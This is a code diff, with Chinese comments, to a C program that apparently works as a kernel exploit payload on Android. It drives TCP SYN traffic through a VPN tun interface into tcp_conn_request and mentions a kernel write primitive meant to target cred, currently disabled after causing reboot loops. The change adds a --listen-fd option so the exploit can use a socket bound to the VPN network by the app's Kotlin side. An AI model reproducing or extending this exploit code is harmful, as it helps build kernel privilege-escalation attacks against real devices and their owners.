@@ -83,6 +83,8 @@ static uint32_t g_dst;
 static uint32_t g_src = 0x6307070a; /* 10.7.7.99 */
 static uint16_t g_port = 47777;
 static int g_rounds = 4000;
+/* Kotlin 侧建好并绑到 VPN 网络的监听 fd；-1 表示没有，自己建。 */
+static int g_listen_fd_in = -1;
 
 /* ------------------------------------------------------- 收发与环形缓冲 */
 
@@ -1609,6 +1611,7 @@ int main(int argc, char **argv) {
         else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) g_rounds = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--phase") && i + 1 < argc) phase = argv[++i];
         else if (!strcmp(argv[i], "--ip-options") && i + 1 < argc) g_optlen = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--listen-fd") && i + 1 < argc) g_listen_fd_in = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
         /* 写路径暂时硬关闭：用户实测出现重启循环，在写原语定向到 cred
          * 之前不能真的动内核。参数保留但不再生效，避免旧脚本误开。 */
@@ -1622,8 +1625,33 @@ int main(int argc, char **argv) {
     /* 先探路：监听 socket 要用 g_tun_if 钉网卡，所以必须在 listen_open 之前。 */
     probe_route();
 
-    /* 先真的在目标端口 listen：没有监听套接字，内核不会为 SYN 建请求 sock。 */
-    g_listen_fd = listen_open(g_port);
+    /* 监听 socket 优先用 Kotlin 传进来的那个（已绑到 VPN 网络）。
+     *
+     * 为什么必须这样：SYNACK 的选路用的是监听 socket 所属网络的路由表。
+     * 载荷自己建的 socket 归属应用默认网络（wifi），查不到 10.7.7.0/24，
+     * inet_csk_route_req() 返回 NULL，SYNACK 被静默丢弃 —— 实测日志里
+     * 「到 10.7.7.99 有路由但选的本机源地址是 192.168.1.7」就是证据。
+     * Kotlin 侧 Network.bindSocket() 是显式绑定，路由域确定。
+     *
+     * 没有监听套接字内核就不会为 SYN 建请求 sock，所以这条不能省。 */
+    if (g_listen_fd_in >= 0) {
+        g_listen_fd = g_listen_fd_in;
+        int fl = fcntl(g_listen_fd, F_GETFL, 0);
+        if (fl >= 0) fcntl(g_listen_fd, F_SETFL, fl | O_NONBLOCK);
+        /* 回读一下：继承来的 fd 未必是我们要的那个端口/地址。 */
+        struct sockaddr_in b;
+        socklen_t bl = sizeof(b);
+        if (getsockname(g_listen_fd, (struct sockaddr *)&b, &bl) == 0) {
+            const uint8_t *p = (const uint8_t *)&b.sin_addr.s_addr;
+            say("[listen] 使用 Kotlin 传来的 fd=%d，实际监听 %u.%u.%u.%u:%u",
+                g_listen_fd, p[0], p[1], p[2], p[3], ntohs(b.sin_port));
+        } else {
+            say("[listen] 使用 Kotlin 传来的 fd=%d（getsockname 失败 errno=%d）",
+                g_listen_fd, errno);
+        }
+    } else {
+        g_listen_fd = listen_open(g_port);
+    }
     if (g_listen_fd < 0) {
         FAIL("监听端口失败，无法进入 tcp_conn_request");
         return 2;
